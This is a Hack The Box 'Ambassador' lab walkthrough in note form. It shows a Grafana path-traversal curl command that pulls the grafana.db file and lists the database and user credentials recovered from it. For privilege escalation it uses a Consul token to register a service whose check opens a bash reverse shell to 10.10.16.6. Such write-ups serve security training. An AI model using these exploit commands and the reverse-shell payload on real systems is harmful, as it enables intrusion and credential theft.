Hack the box Ambassador

Initial Scan

PORT 80 running a hugo site which a static site generater framework   
PORT 3000 running Grafana. A grafical monitering tool   
PORT 3306 running mysql   

unauthenticated path traversal vuln in grafana version 3.2.0   
Referance [https://www.exploit-db.com/exploits/50581]( https://www.exploit-db.com/exploits/50581)   
More about path traversal [https://j0vsec.com/post/cve-2021-43798/](https://j0vsec.com/post/cve-2021-43798/)   

**FOOTHOLD**    
Default config of grafana is using sqlite3 and the db file store on /var/lib/grafana/grafana.db

Downloading Grafana.db

```bash
curl --path-as-is "http://10.129.208.1:3000/public/plugins/state-timeline/../../../../../../../../../../../../../var/lib/grafana/grafana.db" -O grafana.db
```

Found Mysql Creds
```bash
Username:grafana
password:dontStandSoCloseToMe63221!
Database:grafana
```
Grafana login Creds
```bash
username:admin
password:dad0e56900c3be93ce114804726f78c91e82a0f0f0f6b248da419a0cac6157e02806498f1f784146715caee5bad1506ab069
salt:0X27trve2u
````
connect mysql using creds and found another creds from whackywedget database      

User Creds 
```bash
developer:YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==:anEnglishManInNewYork027468
```
**PRIVILEAGE ESCALATION**

Found token from local git commit of my-app in opt dir
```bash
ACL token:bb03b43b-1d81-d62b-24b5-39540ee469b5
```
Making exploit

Referance API doc
[https://www.consul.io/api-docs/agent/service](https://www.consul.io/api-docs/agent/service)   
Referance about default port [https://stackoverflow.com/questions/30684262/different-ports-used-by-consul](https://stackoverflow.com/questions/30684262/different-ports-used-by-consul)   
```bash
curl http://127.0.0.1:8500/v1/agent/services -H "X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5"
curl -X PUT http://127.0.0.1:8500/v1/agent/services/register -H "X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5" --data @rce.json
```
rce.json
```json
{
  "ID": "rce3",
  "Name": "rce3",
  "Tags": ["primary", "v1"],
  "Address": "127.0.0.1",
  "Port": 80,
  "Check": {
    "Args": ["bash", "-c", "bash -i >& /dev/tcp/10.10.16.6/9001 0>&1"],
    "Interval": "10s",
    "Timeout": "86400s"
  }
}
```